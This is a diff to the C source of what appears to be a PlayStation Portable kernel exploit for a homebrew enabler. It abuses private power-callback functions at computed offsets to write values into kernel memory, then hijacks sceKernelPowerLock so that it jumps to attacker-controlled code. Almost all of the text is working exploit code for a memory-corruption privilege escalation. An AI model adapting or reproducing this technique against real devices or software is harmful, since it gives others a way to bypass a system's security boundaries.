@@ -121,6 +121,8 @@ main(void)
 	unsigned int intr;
 	unsigned int* address_low = (unsigned int *) 0x08800000;
 	unsigned int* address_high = (unsigned int *) 0x08800004;
+	u32 kernel_entry, entry_addr;
+
 	/* prototype of sceUtility_private_2DC8380C, scePower_driver_CE5D389B */
 	int (*_scePowerUnregisterCallback)(int);
 	/* prototype of sceUtility_private_764F5A3C, scePower_driver_1A41E0ED */
@@ -152,39 +154,43 @@ main(void)
 
 	log("find htmlviewer entry at %p\n", address_low);
 	memset((void *) 0x08800000, 0, 0x00100000);
-	_scePowerUnregisterCallback = (void*) ((unsigned int) address_low - 648U);
+	log("memset done\n");
+
+	_scePowerUnregisterCallback = (void *) ((unsigned int) address_low - 648U);
 	log("power unregister at %p\n", _scePowerUnregisterCallback);
-	_scePowerUnregisterCallback(0x08080000); /* it will save -1 to addr (p) so that scePowerRegisterCallback can move on */
+	_scePowerUnregisterCallback(0x08080000); /* it will save -1 to addr (p) to enable scePowerRegisterCallback */
 	log("power unregister done\n");
 	ClearCaches();
 
-	p = (unsigned int *) 0x08800000;
+	p = (unsigned int *) (0x08800000);
 
 	do {
 		if (*p == 0xFFFFFFFF)
 			break;
 		p++;
-	} while (p < (unsigned int *) 0x08900000);
+	} while (p < (unsigned int *) (0x08900000));
 
-	if (p == (unsigned int *) 0x08900000) /* panic if unregister fails */
+	if (p == (unsigned int *) (0x08900000)) /* panic if unregister fails */
 		panic();
 
 	log("find -1 at %p\n", p);
+
 	sceuid = sceKernelCreateCallback("hen", 0, 0);
 	_scePowerRegisterCallback = (void *) ((unsigned int) address_low - 624U);
 	log("power register\n");
 	/* this line stores 0/nop to 0x0880CCBC */
-	_scePowerRegisterCallback((0x0880CCB0U -(unsigned int) p) >> 4, sceuid);
+	_scePowerRegisterCallback((0x0880CCB0U - (unsigned int) p) >> 4, sceuid);
 	log("power register done\n");
 	ClearCaches();
 
-	_sw((unsigned int) power_callback, 0x08800010);
-	_sw(0x08800000, 0x08804234);
-	ClearCaches();
+	kernel_entry = (u32) power_callback;
+	entry_addr = ((u32) &kernel_entry) - 16;
+
+	sceKernelDelayThread(10000000);
 
 	log("suspend intr\n");
 	intr = sceKernelCpuSuspendIntr();
-	sceKernelPowerLock(0, 0x08800000);
+	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x4234);
 	sceKernelCpuResumeIntr(intr);
 	log("resumed intr\n");
 
